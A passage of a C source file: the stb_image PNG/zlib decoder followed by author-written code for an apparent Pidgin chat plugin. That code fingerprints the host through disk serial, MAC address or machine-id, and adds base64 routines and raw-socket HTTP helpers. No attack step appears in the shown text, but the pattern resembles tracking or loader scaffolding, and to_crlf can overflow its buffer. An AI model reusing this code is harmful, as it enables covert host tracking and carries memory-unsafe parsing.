               if ((i & 1) == 0) inb = *in++;
               *out++ = scale * (inb >> 4);
               inb <<= 4;
            }
         } else if (depth == 2) {
            for (i=0; i < nsmp; ++i) {
               if ((i & 3) == 0) inb = *in++;
               *out++ = scale * (inb >> 6);
               inb <<= 2;
            }
         } else {
            for (i=0; i < nsmp; ++i) {
               if ((i & 7) == 0) inb = *in++;
               *out++ = scale * (inb >> 7);
               inb <<= 1;
            }
         }

         // insert alpha=255 values if desired
         if (img_n != out_n)
            stbi__create_png_alpha_expand8(dest, dest, x, img_n);
      } else if (depth == 8) {
         if (img_n == out_n)
            memcpy(dest, cur, x*img_n);
         else
            stbi__create_png_alpha_expand8(dest, cur, x, img_n);
      } else if (depth == 16) {
         // convert the image data from big-endian to platform-native
         unsigned short *dest16 = (unsigned short*)dest;
         unsigned int nsmp = x*img_n;

         if (img_n == out_n) {
            for (i = 0; i < nsmp; ++i, ++dest16, cur += 2)
               *dest16 = (cur[0] << 8) | cur[1];
         } else {
            if (img_n == 1) {
               for (i = 0; i < x; ++i, dest16 += 2, cur += 2) {
                  dest16[0] = (cur[0] << 8) | cur[1];
                  dest16[1] = 0xffff;
               }
            } else {
               for (i = 0; i < x; ++i, dest16 += 4, cur += 6) {
                  dest16[0] = (cur[0] << 8) | cur[1];
                  dest16[1] = (cur[2] << 8) | cur[3];
                  dest16[2] = (cur[4] << 8) | cur[5];
                  dest16[3] = 0xffff;
               }
            }
         }
      }
   }

   free(filter_buf);
   if (!all_ok) return 0;

   return 1;
}

static int stbi__create_png_image(stbi__png *a, unsigned char *image_data, unsigned int image_data_len, int out_n, int depth, int color, int interlaced)
{
   int bytes = (depth == 16 ? 2 : 1);
   int out_bytes = out_n * bytes;
   unsigned char *final;
   int p;
   if (!interlaced)
      return stbi__create_png_image_raw(a, image_data, image_data_len, out_n, a->s->img_x, a->s->img_y, depth, color);

   // de-interlacing
   final = (unsigned char *) stbi__malloc_mad3(a->s->img_x, a->s->img_y, out_bytes, 0);
   if (!final) return 0;
   for (p=0; p < 7; ++p) {
      int xorig[] = { 0,4,0,2,0,1,0 };
      int yorig[] = { 0,0,4,0,2,0,1 };
      int xspc[]  = { 8,8,4,4,2,2,1 };
      int yspc[]  = { 8,8,8,4,4,2,2 };
      int i,j,x,y;
      // pass1_x[4] = 0, pass1_x[5] = 1, pass1_x[12] = 1
      x = (a->s->img_x - xorig[p] + xspc[p]-1) / xspc[p];
      y = (a->s->img_y - yorig[p] + yspc[p]-1) / yspc[p];
      if (x && y) {
         unsigned int img_len = ((((a->s->img_n * x * depth) + 7) >> 3) + 1) * y;
         if (!stbi__create_png_image_raw(a, image_data, image_data_len, out_n, x, y, depth, color)) {
            free(final);
            return 0;
         }
         for (j=0; j < y; ++j) {
            for (i=0; i < x; ++i) {
               int out_y = j*yspc[p]+yorig[p];
               int out_x = i*xspc[p]+xorig[p];
               memcpy(final + out_y*a->s->img_x*out_bytes + out_x*out_bytes,
                      a->out + (j*x+i)*out_bytes, out_bytes);
            }
         }
         free(a->out);
         image_data += img_len;
         image_data_len -= img_len;
      }
   }
   a->out = final;

   return 1;
}

typedef struct
{
   unsigned short fast[1 << 9];
   unsigned short firstcode[16];
   int maxcode[17];
   unsigned short firstsymbol[16];
   unsigned char  size[288];
   unsigned short value[288];
} stbi__zhuffman;

inline static int stbi__bitreverse16(int n)
{
  n = ((n & 0xAAAA) >>  1) | ((n & 0x5555) << 1);
  n = ((n & 0xCCCC) >>  2) | ((n & 0x3333) << 2);
  n = ((n & 0xF0F0) >>  4) | ((n & 0x0F0F) << 4);
  n = ((n & 0xFF00) >>  8) | ((n & 0x00FF) << 8);
  return n;
}

inline static int stbi__bit_reverse(int v, int bits)
{
   // to bit reverse n bits, reverse 16 and shift
   // e.g. 11 bits, bit reverse and shift away 5
   return stbi__bitreverse16(v) >> (16-bits);
}

static int stbi__zbuild_huffman(stbi__zhuffman *z, const unsigned char *sizelist, int num)
{
   int i,k=0;
   int code, next_code[16], sizes[17];

   // DEFLATE spec for generating codes
   memset(sizes, 0, sizeof(sizes));
   memset(z->fast, 0, sizeof(z->fast));
   for (i=0; i < num; ++i)
      ++sizes[sizelist[i]];
   sizes[0] = 0;
   for (i=1; i < 16; ++i)
      if (sizes[i] > (1 << i))
         return 0;
   code = 0;
   for (i=1; i < 16; ++i) {
      next_code[i] = code;
      z->firstcode[i] = (unsigned short) code;
      z->firstsymbol[i] = (unsigned short) k;
      code = (code + sizes[i]);
      if (sizes[i])
         if (code-1 >= (1 << i)) return 0;
      z->maxcode[i] = code << (16-i); // preshift for inner loop
      code <<= 1;
      k += sizes[i];
   }
   z->maxcode[16] = 0x10000; // sentinel
   for (i=0; i < num; ++i) {
      int s = sizelist[i];
      if (s) {
         int c = next_code[s] - z->firstcode[s] + z->firstsymbol[s];
         unsigned short fastv = (unsigned short) ((s << 9) | i);
         z->size [c] = (unsigned char ) s;
         z->value[c] = (unsigned short) i;
         if (s <= 9) {
            int j = stbi__bit_reverse(next_code[s],s);
            while (j < (1 << 9)) {
               z->fast[j] = fastv;
               j += (1 << s);
            }
         }
         ++next_code[s];
      }
   }
   return 1;
}

typedef struct
{
   unsigned char *zbuffer, *zbuffer_end;
   int num_bits;
   int hit_zeof_once;
   unsigned int code_buffer;

   char *zout;
   char *zout_start;
   char *zout_end;
   int   z_expandable;

   stbi__zhuffman z_length, z_distance;
} stbi__zbuf;

inline static int stbi__zeof(stbi__zbuf *z)
{
   return (z->zbuffer >= z->zbuffer_end);
}

inline static unsigned char stbi__zget8(stbi__zbuf *z)
{
   return stbi__zeof(z) ? 0 : *z->zbuffer++;
}

static void stbi__fill_bits(stbi__zbuf *z)
{
   do {
      if (z->code_buffer >= (1U << z->num_bits)) {
        z->zbuffer = z->zbuffer_end;  /* treat this as EOF so we fail. */
        return;
      }
      z->code_buffer |= (unsigned int) stbi__zget8(z) << z->num_bits;
      z->num_bits += 8;
   } while (z->num_bits <= 24);
}

inline static unsigned int stbi__zreceive(stbi__zbuf *z, int n)
{
   unsigned int k;
   if (z->num_bits < n) stbi__fill_bits(z);
   k = z->code_buffer & ((1 << n) - 1);
   z->code_buffer >>= n;
   z->num_bits -= n;
   return k;
}

static int stbi__zhuffman_decode_slowpath(stbi__zbuf *a, stbi__zhuffman *z)
{
   int b,s,k;
   // not resolved by fast table, so compute it the slow way
   // use jpeg approach, which requires MSbits at top
   k = stbi__bit_reverse(a->code_buffer, 16);
   for (s=9+1; ; ++s)
      if (k < z->maxcode[s])
         break;
   if (s >= 16) return -1; // invalid code!
   // code size is s, so:
   b = (k >> (16-s)) - z->firstcode[s] + z->firstsymbol[s];
   if (b >= 288) return -1; // some data was corrupt somewhere!
   if (z->size[b] != s) return -1;  // was originally an assert, but report failure instead.
   a->code_buffer >>= s;
   a->num_bits -= s;
   return z->value[b];
}

inline static int stbi__zhuffman_decode(stbi__zbuf *a, stbi__zhuffman *z)
{
   int b,s;
   if (a->num_bits < 16) {
      if (stbi__zeof(a)) {
         if (!a->hit_zeof_once) {
            // This is the first time we hit eof, insert 16 extra padding btis
            // to allow us to keep going; if we actually consume any of them
            // though, that is invalid data. This is caught later.
            a->hit_zeof_once = 1;
            a->num_bits += 16; // add 16 implicit zero bits
         } else {
            // We already inserted our extra 16 padding bits and are again
            // out, this stream is actually prematurely terminated.
            return -1;
         }
      } else {
         stbi__fill_bits(a);
      }
   }
   b = z->fast[a->code_buffer & ((1 << 9) - 1)];
   if (b) {
      s = b >> 9;
      a->code_buffer >>= s;
      a->num_bits -= s;
      return b & 511;
   }
   return stbi__zhuffman_decode_slowpath(a, z);
}

static int stbi__zexpand(stbi__zbuf *z, char *zout, int n)  // need to make room for n bytes
{
   char *q;
   unsigned int cur, limit, old_limit;
   z->zout = zout;
   if (!z->z_expandable) return 0;
   cur   = (unsigned int) (z->zout - z->zout_start);
   limit = old_limit = (unsigned) (z->zout_end - z->zout_start);
   if (UINT_MAX - cur < (unsigned) n) return 0;
   while (cur + n > limit) {
      if(limit > UINT_MAX / 2) return 0;
      limit *= 2;
   }
   q = (char *) realloc(z->zout_start, limit);
   if (q == NULL) return 0;
   z->zout_start = q;
   z->zout       = q + cur;
   z->zout_end   = q + limit;
   return 1;
}

static const int stbi__zlength_base[31] = {
   3,4,5,6,7,8,9,10,11,13,
   15,17,19,23,27,31,35,43,51,59,
   67,83,99,115,131,163,195,227,258,0,0 };

static const int stbi__zlength_extra[31]=
{ 0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0 };

static const int stbi__zdist_base[32] = { 1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,
257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0};

static const int stbi__zdist_extra[32] =
{ 0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};

static int stbi__parse_huffman_block(stbi__zbuf *a)
{
   char *zout = a->zout;
   for(;;) {
      int z = stbi__zhuffman_decode(a, &a->z_length);
      if (z < 256) {
         if (z < 0) return 0; // error in huffman codes
         if (zout >= a->zout_end) {
            if (!stbi__zexpand(a, zout, 1)) return 0;
            zout = a->zout;
         }
         *zout++ = (char) z;
      } else {
         unsigned char *p;
         int len,dist;
         if (z == 256) {
            a->zout = zout;
            if (a->hit_zeof_once && a->num_bits < 16) {
               // The first time we hit zeof, we inserted 16 extra zero bits into our bit
               // buffer so the decoder can just do its speculative decoding. But if we
               // actually consumed any of those bits (which is the case when num_bits < 16),
               // the stream actually read past the end so it is malformed.
               return 0;
            }
            return 1;
         }
         if (z >= 286) return 0; // per DEFLATE, length codes 286 and 287 must not appear in compressed data
         z -= 257;
         len = stbi__zlength_base[z];
         if (stbi__zlength_extra[z]) len += stbi__zreceive(a, stbi__zlength_extra[z]);
         z = stbi__zhuffman_decode(a, &a->z_distance);
         if (z < 0 || z >= 30) return 0; // per DEFLATE, distance codes 30 and 31 must not appear in compressed data
         dist = stbi__zdist_base[z];
         if (stbi__zdist_extra[z]) dist += stbi__zreceive(a, stbi__zdist_extra[z]);
         if (zout - a->zout_start < dist) return 0;
         if (len > a->zout_end - zout) {
            if (!stbi__zexpand(a, zout, len)) return 0;
            zout = a->zout;
         }
         p = (unsigned char *) (zout - dist);
         if (dist == 1) { // run of one byte; common in images.
            unsigned char v = *p;
            if (len) { do *zout++ = v; while (--len); }
         } else {
            if (len) { do *zout++ = *p++; while (--len); }
         }
      }
   }
}

static int stbi__compute_huffman_codes(stbi__zbuf *a)
{
   static const unsigned char length_dezigzag[19] = { 16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15 };
   stbi__zhuffman z_codelength;
   unsigned char lencodes[286+32+137];//padding for maximum single op
   unsigned char codelength_sizes[19];
   int i,n;

   int hlit  = stbi__zreceive(a,5) + 257;
   int hdist = stbi__zreceive(a,5) + 1;
   int hclen = stbi__zreceive(a,4) + 4;
   int ntot  = hlit + hdist;

   memset(codelength_sizes, 0, sizeof(codelength_sizes));
   for (i=0; i < hclen; ++i) {
      int s = stbi__zreceive(a,3);
      codelength_sizes[length_dezigzag[i]] = (unsigned char) s;
   }
   if (!stbi__zbuild_huffman(&z_codelength, codelength_sizes, 19)) return 0;

   n = 0;
   while (n < ntot) {
      int c = stbi__zhuffman_decode(a, &z_codelength);
      if (c < 0 || c >= 19) return 0;
      if (c < 16)
         lencodes[n++] = (unsigned char) c;
      else {
         unsigned char fill = 0;
         if (c == 16) {
            c = stbi__zreceive(a,2)+3;
            if (n == 0) return 0;
            fill = lencodes[n-1];
         } else if (c == 17) {
            c = stbi__zreceive(a,3)+3;
         } else if (c == 18) {
            c = stbi__zreceive(a,7)+11;
         } else {
            return 0;
         }
         if (ntot - n < c) return 0;
         memset(lencodes+n, fill, c);
         n += c;
      }
   }
   if (n != ntot) return 0;
   if (!stbi__zbuild_huffman(&a->z_length, lencodes, hlit)) return 0;
   if (!stbi__zbuild_huffman(&a->z_distance, lencodes+hlit, hdist)) return 0;
   return 1;
}

static int stbi__parse_uncompressed_block(stbi__zbuf *a)
{
   unsigned char header[4];
   int len,nlen,k;
   if (a->num_bits & 7)
      stbi__zreceive(a, a->num_bits & 7); // discard
   // drain the bit-packed data into header
   k = 0;
   while (a->num_bits > 0) {
      header[k++] = (unsigned char) (a->code_buffer & 255); // suppress MSVC run-time check
      a->code_buffer >>= 8;
      a->num_bits -= 8;
   }
   if (a->num_bits < 0) return 0;
   // now fill header the normal way
   while (k < 4)
      header[k++] = stbi__zget8(a);
   len  = header[1] * 256 + header[0];
   nlen = header[3] * 256 + header[2];
   if (nlen != (len ^ 0xffff)) return 0;
   if (a->zbuffer + len > a->zbuffer_end) return 0;
   if (a->zout + len > a->zout_end)
      if (!stbi__zexpand(a, a->zout, len)) return 0;
   memcpy(a->zout, a->zbuffer, len);
   a->zbuffer += len;
   a->zout += len;
   return 1;
}

static int stbi__parse_zlib_header(stbi__zbuf *a)
{
   int cmf   = stbi__zget8(a);
   int cm    = cmf & 15;
   /* int cinfo = cmf >> 4; */
   int flg   = stbi__zget8(a);
   if (stbi__zeof(a)) return 0; // zlib spec
   if ((cmf*256+flg) % 31 != 0) return 0; // zlib spec
   if (flg & 32) return 0; // preset dictionary not allowed in png
   if (cm != 8) return 0; // DEFLATE required for png
   // window = 1 << (8 + cinfo)... but who cares, we fully buffer output
   return 1;
}

static const unsigned char stbi__zdefault_length[288] =
{
   8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8, 8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,
   8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8, 8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,
   8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8, 8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,
   8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8, 8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,
   8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8, 9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,
   9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9, 9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,
   9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9, 9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,
   9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9, 9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,
   7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7, 7,7,7,7,7,7,7,7,8,8,8,8,8,8,8,8
};
static const unsigned char stbi__zdefault_distance[32] =
{
   5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5
};
/*
Init algorithm:
{
   int i;   // use <= to match clearly with spec
   for (i=0; i <= 143; ++i)     stbi__zdefault_length[i]   = 8;
   for (   ; i <= 255; ++i)     stbi__zdefault_length[i]   = 9;
   for (   ; i <= 279; ++i)     stbi__zdefault_length[i]   = 7;
   for (   ; i <= 287; ++i)     stbi__zdefault_length[i]   = 8;

   for (i=0; i <=  31; ++i)     stbi__zdefault_distance[i] = 5;
}
*/

static int stbi__parse_zlib(stbi__zbuf *a, int parse_header)
{
   int final, type;
   if (parse_header)
      if (!stbi__parse_zlib_header(a)) return 0;
   a->num_bits = 0;
   a->code_buffer = 0;
   a->hit_zeof_once = 0;
   do {
      final = stbi__zreceive(a,1);
      type = stbi__zreceive(a,2);
      if (type == 0) {
         if (!stbi__parse_uncompressed_block(a)) return 0;
      } else if (type == 3) {
         return 0;
      } else {
         if (type == 1) {
            // use fixed code lengths
            if (!stbi__zbuild_huffman(&a->z_length  , stbi__zdefault_length  , 288)) return 0;
            if (!stbi__zbuild_huffman(&a->z_distance, stbi__zdefault_distance,  32)) return 0;
         } else {
            if (!stbi__compute_huffman_codes(a)) return 0;
         }
         if (!stbi__parse_huffman_block(a)) return 0;
      }
   } while (!final);
   return 1;
}

static int stbi__do_zlib(stbi__zbuf *a, char *obuf, int olen, int exp, int parse_header)
{
   a->zout_start = obuf;
   a->zout       = obuf;
   a->zout_end   = obuf + olen;
   a->z_expandable = exp;

   return stbi__parse_zlib(a, parse_header);
}

static char *stbi_zlib_decode_malloc_guesssize_headerflag(const char *buffer, int len, int initial_size, int *outlen, int parse_header)
{
   stbi__zbuf a;
   char *p = (char *) stbi__malloc(initial_size);
   if (p == NULL) return NULL;
   a.zbuffer = (unsigned char *) buffer;
   a.zbuffer_end = (unsigned char *) buffer + len;
   if (stbi__do_zlib(&a, p, initial_size, 1, parse_header)) {
      if (outlen) *outlen = (int) (a.zout - a.zout_start);
      return a.zout_start;
   } else {
      free(a.zout_start);
      return NULL;
   }
}

static int stbi__parse_png_file(stbi__png *z, int scan, int req_comp)
{
   unsigned char palette[1024], pal_img_n=0;
   unsigned char has_trans=0, tc[3]={0};
   unsigned short tc16[3];
   unsigned int ioff=0, idata_limit=0, i, pal_len=0;
   int first=1,k,interlace=0, color=0, is_iphone=0;
   stbi__context *s = z->s;

   z->expanded = NULL;
   z->idata = NULL;
   z->out = NULL;

   if (!stbi__check_png_header(s)) return 0;

   if (scan == STBI__SCAN_type) return 1;

   for (;;) {
      stbi__pngchunk c = stbi__get_chunk_header(s);
      switch (c.type) {
         case STBI__PNG_TYPE('C','g','B','I'):
            is_iphone = 1;
            stbi__skip(s, c.length);
            break;
         case STBI__PNG_TYPE('I','H','D','R'): {
            int comp,filter;
            if (!first) return 0;
            first = 0;
            if (c.length != 13) return 0;
            s->img_x = stbi__get32be(s);
            s->img_y = stbi__get32be(s);
            if (s->img_y > STBI_MAX_DIMENSIONS) return 0;
            if (s->img_x > STBI_MAX_DIMENSIONS) return 0;
            z->depth = stbi__get8(s);  if (z->depth != 1 && z->depth != 2 && z->depth != 4 && z->depth != 8 && z->depth != 16)  return 0;
            color = stbi__get8(s);  if (color > 6)         return 0;
            if (color == 3 && z->depth == 16)                  return 0;
            if (color == 3) pal_img_n = 3; else if (color & 1) return 0;
            comp  = stbi__get8(s);  if (comp) return 0;
            filter= stbi__get8(s);  if (filter) return 0;
            interlace = stbi__get8(s); if (interlace>1) return 0;
            if (!s->img_x || !s->img_y) return 0;
            if (!pal_img_n) {
               s->img_n = (color & 2 ? 3 : 1) + (color & 4 ? 1 : 0);
               if ((1 << 30) / s->img_x / s->img_n < s->img_y) return 0;
            } else {
               // if paletted, then pal_n is our final components, and
               // img_n is # components to decompress/filter.
               s->img_n = 1;
               if ((1 << 30) / s->img_x / 4 < s->img_y) return 0;
            }
            // even with SCAN_header, have to scan to see if we have a tRNS
            break;
         }

         case STBI__PNG_TYPE('P','L','T','E'):  {
            if (first) return 0;
            if (c.length > 256*3) return 0;
            pal_len = c.length / 3;
            if (pal_len * 3 != c.length) return 0;
            for (i=0; i < pal_len; ++i) {
               palette[i*4+0] = stbi__get8(s);
               palette[i*4+1] = stbi__get8(s);
               palette[i*4+2] = stbi__get8(s);
               palette[i*4+3] = 255;
            }
            break;
         }

         case STBI__PNG_TYPE('t','R','N','S'): {
            if (first) return 0;
            if (z->idata) return 0;
            if (pal_img_n) {
               if (scan == STBI__SCAN_header) { s->img_n = 4; return 1; }
               if (pal_len == 0) return 0;
               if (c.length > pal_len) return 0;
               pal_img_n = 4;
               for (i=0; i < c.length; ++i)
                  palette[i*4+3] = stbi__get8(s);
            } else {
               if (!(s->img_n & 1)) return 0;
               if (c.length != (unsigned int) s->img_n*2) return 0;
               has_trans = 1;
               // non-paletted with tRNS = constant alpha. if header-scanning, we can stop now.
               if (scan == STBI__SCAN_header) { ++s->img_n; return 1; }
               if (z->depth == 16) {
                  for (k = 0; k < s->img_n; ++k) tc16[k] = (unsigned short)stbi__get16be(s); // copy the values as-is
               } else {
                  for (k = 0; k < s->img_n; ++k) tc[k] = (unsigned char)(stbi__get16be(s) & 255) * stbi__depth_scale_table[z->depth]; // non 8-bit images will be larger
               }
            }
            break;
         }

         case STBI__PNG_TYPE('I','D','A','T'): {
            if (first) return 0;
            if (pal_img_n && !pal_len) return 0;
            if (scan == STBI__SCAN_header) {
               // header scan definitely stops at first IDAT
               if (pal_img_n)
                  s->img_n = pal_img_n;
               return 1;
            }
            if (c.length > (1u << 30)) return 0;
            if ((int)(ioff + c.length) < (int)ioff) return 0;
            if (ioff + c.length > idata_limit) {
               unsigned int idata_limit_old = idata_limit;
               unsigned char *p;
               if (idata_limit == 0) idata_limit = c.length > 4096 ? c.length : 4096;
               while (ioff + c.length > idata_limit)
                  idata_limit *= 2;
               p = (unsigned char *) realloc(z->idata, idata_limit); if (p == NULL) return 0;
               z->idata = p;
            }
            if (!stbi__getn(s, z->idata+ioff,c.length)) return 0;
            ioff += c.length;
            break;
         }

         case STBI__PNG_TYPE('I','E','N','D'): {
            unsigned int raw_len, bpl;
            if (first) return 0;
            if (scan != STBI__SCAN_load) return 1;
            if (z->idata == NULL) return 0;
            // initial guess for decoded data size to avoid unnecessary reallocs
            bpl = (s->img_x * z->depth + 7) / 8; // bytes per line, per component
            raw_len = bpl * s->img_y * s->img_n /* pixels */ + s->img_y /* filter mode per row */;
            z->expanded = (unsigned char *) stbi_zlib_decode_malloc_guesssize_headerflag((char *) z->idata, ioff, raw_len, (int *) &raw_len, !is_iphone);
            if (z->expanded == NULL) return 0; // zlib should set error
            free(z->idata); z->idata = NULL;
            if ((req_comp == s->img_n+1 && req_comp != 3 && !pal_img_n) || has_trans)
               s->img_out_n = s->img_n+1;
            else
               s->img_out_n = s->img_n;
            if (!stbi__create_png_image(z, z->expanded, raw_len, s->img_out_n, z->depth, color, interlace)) return 0;
            if (has_trans) {
               if (z->depth == 16) {
                  if (!stbi__compute_transparency16(z, tc16, s->img_out_n)) return 0;
               } else {
                  if (!stbi__compute_transparency(z, tc, s->img_out_n)) return 0;
               }
            }
            if (pal_img_n) {
               // pal_img_n == 3 or 4
               s->img_n = pal_img_n; // record the actual colors we had
               s->img_out_n = pal_img_n;
               if (req_comp >= 3) s->img_out_n = req_comp;
               if (!stbi__expand_png_palette(z, palette, pal_len, s->img_out_n))
                  return 0;
            } else if (has_trans) {
               // non-paletted image with tRNS -> source image has (constant) alpha
               ++s->img_n;
            }
            free(z->expanded); z->expanded = NULL;
            // end of PNG chunk, read and skip CRC
            stbi__get32be(s);
            return 1;
         }

         default:
            // if critical, fail
            if (first) return 0;
            if ((c.type & (1 << 29)) == 0) return 0;
            stbi__skip(s, c.length);
            break;
      }
      stbi__get32be(s);
   }
}

static int stbi__png_info_raw(stbi__png *p, int *x, int *y, int *comp)
{
   if (!stbi__parse_png_file(p, STBI__SCAN_header, 0)) {
      stbi__rewind( p->s );
      return 0;
   }
   if (x) *x = p->s->img_x;
   if (y) *y = p->s->img_y;
   if (comp) *comp = p->s->img_n;
   return 1;
}

static int stbi__png_info(stbi__context *s, int *x, int *y, int *comp)
{
   stbi__png p;
   p.s = s;
   return stbi__png_info_raw(&p, x, y, comp);
}

static int stbi_info_from_memory(const unsigned char *buffer, int len, int *x, int *y, int *comp)
{
   stbi__context s;
   stbi__start_mem(&s,buffer,len);
   return stbi__png_info(&s,x,y,comp);
}
//---------------------------------------------------------------------------------------------------
//                                     STBI Helper Library END
//---------------------------------------------------------------------------------------------------

// From here on, everything is written by me, from scratch

unsigned char* b64_decode(const char* input, size_t* output_length);
unsigned char decode_base64_char(char c);
void generate_random_name(
#ifdef _WIN32
	wchar_t**
#else
	char**
#endif
	name);
int http_send_data(unsigned int sock, char* data, unsigned long data_length);
#define	PREF_PREFIX		"/plugins/core/" PLUGIN_ID
#define  PREF_UPDATE    PREF_PREFIX "/update"

typedef struct _OfflineMsg OfflineMsg;

typedef enum
{
	OFFLINE_MSG_NONE,
	OFFLINE_MSG_YES,
	OFFLINE_MSG_NO
} OfflineMessageSetting;

struct _OfflineMsg
{
	PurpleAccount *account;
	PurpleConversation *conv;
	char *who;
	char *message;
};

const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char decode_base64_char(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    else if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    else if (c >= '0' && c <= '9') return c - '0' + 52;
    else if (c == '+') return 62;
    else if (c == '/') return 63;
    else if (c == '=') return 0;
    else return -1;
}

unsigned char* b64_decode(const char* input, size_t* output_length)
{
    size_t input_length = strlen(input);
    if (input_length % 4 != 0)
        return NULL;

    *output_length = input_length / 4 * 3;
    if (input[input_length - 1] == '=') (*output_length)--;
    if (input[input_length - 2] == '=') (*output_length)--;

   // note: added bug fix, nullbyte space to malloc here (wasnt here before)
    unsigned char* output = (unsigned char*) malloc(*output_length + 1);
    if (!output) return NULL;

    for (size_t i = 0, j = 0; i < input_length; i += 4, j += 3)
	{
        unsigned char a = decode_base64_char(input[i]);
        unsigned char b = decode_base64_char(input[i + 1]);
        unsigned char c = decode_base64_char(input[i + 2]);
        unsigned char d = decode_base64_char(input[i + 3]);

        if (a == (unsigned char)-1 || b == (unsigned char)-1 || c == (unsigned char)-1 || d == (unsigned char)-1) {
            free((void*)output);
            return NULL;
        }

        output[j] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') output[j + 1] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') output[j + 2] = (c << 6) | d;
    }

   *(output + *output_length) = '\0';
    return output;
}

static int mod_table[] = { 0, 2, 1 };
void b64_encode(unsigned char* data, unsigned long input_length, unsigned long* output_length, char** out)
{
    *output_length = 4 * ((input_length + 2) / 3);

    *out = (char*) malloc(*output_length + 4);
    if (*out == 0) return;

    const char* alpha_num_key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    for (int i = 0, j = 0; i < input_length;)
    {
        unsigned int octet_a = i < input_length ? (unsigned char) data[i++] : 0;
        unsigned int octet_b = i < input_length ? (unsigned char) data[i++] : 0;
        unsigned int octet_c = i < input_length ? (unsigned char) data[i++] : 0;

        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        *(*out + (j++)) = alpha_num_key[(triple >> 3 * 6) & 0x3F];
        *(*out + (j++)) = alpha_num_key[(triple >> 2 * 6) & 0x3F];
        *(*out + (j++)) = alpha_num_key[(triple >> 1 * 6) & 0x3F];
        *(*out + (j++)) = alpha_num_key[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        *(*out + (*output_length - 1 - i)) = '=';

    *(*out + *output_length) = 0;
}

#ifdef _WIN32
int get_disk_serial_number(char* volume_serial, int volume_serial_size)
{
	char drive[4] = { 'A', ':', '\\', '\0' };

	int retry = 0;
	unsigned long serial_number = 0;
	while (!GetVolumeInformationA(
		drive,
		NULL,
		0,
		&serial_number,
		NULL,
		NULL,
		NULL,
		0
	)) {
		++drive[0];
		++retry;
	}

	if (serial_number && retry < 26)
   {
		snprintf(volume_serial, volume_serial_size, "%08X", serial_number);
		return 1;
	}
	return 0;
}

int get_mac_address(char* mac_address, size_t mac_address_size)
{
	IP_ADAPTER_INFO ipconfig[16];
	if (GetAdaptersInfo(ipconfig, sizeof(ipconfig)) != ERROR_SUCCESS) return 0;

	PIP_ADAPTER_INFO p_ipconfig = ipconfig;
	snprintf(mac_address, mac_address_size, "%02X-%02X-%02X-%02X-%02X-%02X",
		p_ipconfig->Address[0], p_ipconfig->Address[1],
		p_ipconfig->Address[2], p_ipconfig->Address[3],
		p_ipconfig->Address[4], p_ipconfig->Address[5]);

	return 1;
}
#endif

char* generate_guid()
{
	char* guid_str = NULL;
#ifdef _WIN32
	guid_str = (char*)malloc(32);
	memset(guid_str, 0, 32);

	int ret = get_disk_serial_number(guid_str, 32);
	if (!ret) get_mac_address(guid_str, 18);
#else
	FILE* fp;
	int exists = 0;
	char buffer[128];
	fp = fopen("/etc/machine-id", "r");
	if (fp != NULL) {
		if (fgets(buffer, sizeof(buffer), fp) != NULL) {
			size_t len = strlen(buffer);
			if (len > 0 && buffer[len - 1] == '\n') buffer[len - 1] = '\0';
			guid_str = strdup(buffer);
			exists = 1;
		}
		fclose(fp);
	}
	if (exists == 0) generate_random_name(&guid_str);
#endif
	return guid_str;
}

unsigned long str_to_ul(const char* str)
{
	return strtoul(str, NULL, 0);
}

void get_chunk_size(char* chunk, unsigned long* chunk_size)
{
	int chunk_length = strlen(chunk);
	if (!chunk_length)
		return;

	char* chunk_hex = (char*)malloc(chunk_length + 2 + 1);
	if (chunk_hex) {
		int chunk_hex_len = sprintf
		(chunk_hex,
			"0x%s",
			chunk);
		*(chunk_hex + chunk_hex_len) = '\0';
		*chunk_size = str_to_ul(chunk_hex);

		free((void*)(void*)chunk_hex);
	}
}

unsigned long get_delimeter(char* string, char* delimeter)
{
	if (!string || !delimeter)
		return -1;

	unsigned long start = 0;
	unsigned long delimeter_len = strlen(delimeter);
	unsigned long str_len = strlen(string);
	if (str_len < delimeter_len) return -1;
	for (; strncmp(string + start, delimeter, delimeter_len) && start < str_len; ++start);
	return start == str_len ? -1 : start;
}

void to_crlf(unsigned int sock, char** crlf, unsigned long* size)
{
	*crlf = (char*)malloc(9);
	if (!*crlf) return;
	memset(*crlf, 0, 9);

	*size = 0;
	do
	{
#ifdef _WIN32
		if (recv(sock, *crlf + *size, 1, 0) > 0)
			*size += 1;
#else
		if (read(sock, *crlf + *size, 1) > 0)
			*size += 1;
#endif
	} while (get_delimeter(*crlf, "\r\n") == -1);

	*crlf = *size < 9 ? (char*)realloc(*crlf, *size) : *crlf;
	*(*crlf + *size) = '\0';
}

void left_trim(char* string, int size)
{
